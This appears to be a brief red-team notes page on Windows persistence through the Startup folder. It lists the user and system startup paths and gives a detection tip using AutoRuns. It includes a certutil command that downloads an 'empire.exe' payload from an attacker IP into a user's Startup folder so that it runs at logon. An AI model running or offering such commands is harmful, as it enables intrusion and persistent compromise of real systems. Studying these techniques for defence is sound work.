# Startup Folder

**Placing a program within a startup folder will cause the program to execute when a user logs in.**

&#x20;There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is:

```
C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

The startup folder path for all users is:

```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

for example we can download and place the payload in startup folder with certutil.exe :&#x20;

```
certutil -urlcache -f -split http://10.1.1.5/empire.exe ‘C:\Users\tspeedman\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\empire.exe’
```

## <mark style="color:red;">**Detection**</mark>

use AutoRuns.exe tool and check for files located in users startup folder.
